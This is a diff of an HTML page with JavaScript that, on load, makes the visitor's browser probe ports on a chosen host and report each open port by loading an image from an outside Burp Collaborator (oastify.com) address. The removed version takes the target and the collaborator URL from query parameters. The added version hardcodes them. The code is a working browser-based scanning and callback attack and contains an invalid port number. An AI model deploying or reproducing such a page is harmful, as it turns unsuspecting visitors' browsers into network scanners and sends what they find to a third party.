@@ -1,76 +1,50 @@
-<script type="text/javascript">
-    async function scanPort(host, port) {
-        try {
-            let url = `https://${host}:${port}`;
-            let response = await fetch(url, { mode: 'no-cors' });
-            if (response.ok || response.type === 'opaque') {
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Port Scan and Ping Burp Collaborator</title>
+    <script type="text/javascript">
+        async function scanPort(host, port) {
+            try {
+                let url = `https://${host}:${port}`;
+                await fetch(url, { mode: 'no-cors' });
                 console.log(`Port ${port} is open`);
                 sendPing(port);
                 return port;
-            }
-            return null;
-        } catch (error) {
-            return scanPortWithIframe(host, port);
-        }
-    }
-
-    function scanPortWithIframe(host, port) {
-        return new Promise((resolve) => {
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-
-            let timeout = setTimeout(() => {
-                document.body.removeChild(iframe);
-                resolve(null); // Port is closed or not serving HTTP content
-            }, 5000); // Timeout in milliseconds
-
-            iframe.onload = function() {
-                clearTimeout(timeout);
-                console.log(`Port ${port} is open`);
-                sendPing(port);
-                document.body.removeChild(iframe);
-                resolve(port);
-            };
-
-            iframe.onerror = function() {
-                clearTimeout(timeout);
-                document.body.removeChild(iframe);
-                resolve(null); // Port is closed or not serving HTTP content
-            };
-
-            let url = `https://${host}:${port}`;
-            iframe.src = url;
-            document.body.appendChild(iframe);
-        });
-    }
-
-    async function scanPorts(host, ports) {
-        let openPorts = [];
-        for (let port of ports) {
-            let result = await scanPort(host, port);
-            if (result) {
-                openPorts.push(result);
+            } catch (error) {
+                return null; // Port is closed
             }
         }
-        return openPorts;
-    }
 
-    function sendPing(port) {
-        let collaboratorUrl = new URLSearchParams(window.location.search).get('url');
-        let pingUrl = `${collaboratorUrl}?port=${port}`;
-        let img = new Image();
-        img.src = pingUrl;
-        console.log(`Ping sent to ${pingUrl}`);
-    }
+        async function scanPorts(host, ports) {
+            let openPorts = [];
+            for (let port of ports) {
+                let result = await scanPort(host, port);
+                if (result) {
+                    openPorts.push(result);
+                }
+            }
+            return openPorts;
+        }
 
-    document.addEventListener("DOMContentLoaded", function() {
-        let host = new URLSearchParams(window.location.search).get('host'); // Replace with your target host
-        let ports = [80, 443, 8080,8081,2873, 3000, 22, 21, 378923]; // List of ports to scan
-        scanPorts(host, ports).then(openPorts => {
-            console.log("Open ports:", openPorts);
+        function sendPing(port) {
+            let collaboratorUrl = 'https://d6ktrternvnv02zyiu5g36k2ktqkej28.oastify.com';
+            let pingUrl = `${collaboratorUrl}?port=${port}`;
+            let img = new Image();
+            img.src = pingUrl;
+            console.log(`Ping sent to ${pingUrl}`);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            let host = 'google'; // Replace with your target host
+            let ports = [80, 443, 8080, 3000, 22, 21,378923]; // List of ports to scan
+            scanPorts(host, ports).then(openPorts => {
+                console.log("Open ports:", openPorts);
+            });
         });
-    });
-
-    
-</script>
-
+    </script>
+</head>
+<body>
+    <p>Scanning ports and pinging Burp Collaborator...</p>
+</body>
+</html>
